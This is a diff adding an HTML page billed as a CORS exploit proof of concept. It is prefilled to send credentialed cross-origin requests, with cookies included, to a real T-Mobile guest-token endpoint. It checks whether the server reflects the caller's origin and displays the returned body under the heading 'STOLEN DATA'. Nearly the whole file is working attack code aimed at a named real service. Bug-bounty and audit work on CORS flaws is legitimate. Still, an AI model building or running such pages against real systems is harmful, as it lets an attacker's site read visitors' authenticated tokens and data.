@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Advanced CORS Auditor PoC</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e1e1e1; padding: 20px; }
+        .wrapper { max-width: 900px; margin: auto; }
+        .card { background: #1c2128; border: 1px solid #444c56; border-radius: 8px; padding: 25px; margin-bottom: 20px; border-top: 5px solid #e20074; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        h1 { color: #e20074; margin: 0 0 10px 0; font-size: 1.5rem; text-align: center; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #8b949e; }
+        input, select, textarea { width: 100%; padding: 12px; background: #2d333b; border: 1px solid #444c56; color: white; border-radius: 5px; box-sizing: border-box; font-family: monospace; }
+        .btn-fire { background: #e20074; color: white; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
+        .btn-fire:hover { background: #ff0084; box-shadow: 0 0 15px #e20074; }
+        #log { background: #0d1117; border: 1px solid #30363d; padding: 15px; height: 400px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; margin-top: 15px; border-radius: 5px; white-space: pre-wrap; }
+        .success { color: #39d353; font-weight: bold; }
+        .error { color: #f85149; }
+        .header-val { color: #58a6ff; }
+    </style>
+</head>
+<body>
+
+<div class="wrapper">
+    <div class="card">
+        <h1>Exploit Proof of Concept</h1>
+        <p style="font-size: 0.9rem; text-align: center; color: #8b949e;">Testing Origin: <span id="current-origin" class="header-val"></span></p>
+        
+        <div class="input-group">
+            <label>Vulnerable Endpoint (Target URL):</label>
+            <input type="text" id="url" value="https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens">
+        </div>
+
+        <div style="display: flex; gap: 10px;" class="input-group">
+            <div style="flex: 1;">
+                <label>HTTP Method:</label>
+                <select id="method">
+                    <option value="POST">POST</option>
+                    <option value="GET">GET</option>
+                </select>
+            </div>
+            <div style="flex: 1;">
+                <label>With Credentials (Cookies):</label>
+                <select id="creds">
+                    <option value="include">Yes (include)</option>
+                    <option value="omit">No (omit)</option>
+                </select>
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label>POST Body (JSON):</label>
+            <textarea id="post-body" rows="2">{"brand":"TMO"}</textarea>
+        </div>
+
+        <button class="btn-fire" onclick="runAudit()">Execute Cross-Origin Request</button>
+    </div>
+
+    <div class="card" style="padding: 10px;">
+        <div id="log">Awaiting command...</div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('current-origin').innerText = window.location.origin;
+
+    async function runAudit() {
+        const url = document.getElementById('url').value;
+        const method = document.getElementById('method').value;
+        const creds = document.getElementById('creds').value;
+        const bodyText = document.getElementById('post-body').value;
+        const log = document.getElementById('log');
+
+        log.innerHTML = `<span style="color:#8b949e;">[*] Initiating request to:</span> ${url}\n`;
+
+        try {
+            const options = {
+                method: method,
+                mode: 'cors',
+                credentials: creds,
+                headers: { 'Content-Type': 'application/json' }
+            };
+            if (method === 'POST') options.body = bodyText;
+
+            const response = await fetch(url, options);
+
+            const acao = response.headers.get('Access-Control-Allow-Origin');
+            const acac = response.headers.get('Access-Control-Allow-Credentials');
+            const data = await response.text();
+
+            log.innerHTML += `[+] HTTP Status: <span class="success">${response.status}</span>\n`;
+            log.innerHTML += `[+] ACAO Header: <span class="header-val">${acao || 'None'}</span>\n`;
+            log.innerHTML += `[+] ACAC Header: <span class="header-val">${acac || 'None'}</span>\n\n`;
+            
+            if (acao === window.location.origin) {
+                log.innerHTML += `<span class="success">[!!!] VULNERABILITY CONFIRMED: ORIGIN REFLECTED</span>\n\n`;
+            }
+
+            log.innerHTML += `<b style="color:#e20074;">STOLEN DATA / RESPONSE BODY:</b>\n<hr style="border:0;border-top:1px solid #333;">${data || '[Empty Response]'}`;
+
+        } catch (err) {
+            log.innerHTML += `<span class="error">[!] Error: ${err.message}</span>\n\n`;
+            log.innerHTML += `The browser's Same-Origin Policy blocked the read. \nThis means the server did NOT reflect the ACAO header for this specific origin.`;
+        }
+    }
+</script>
+</body>
+</html>
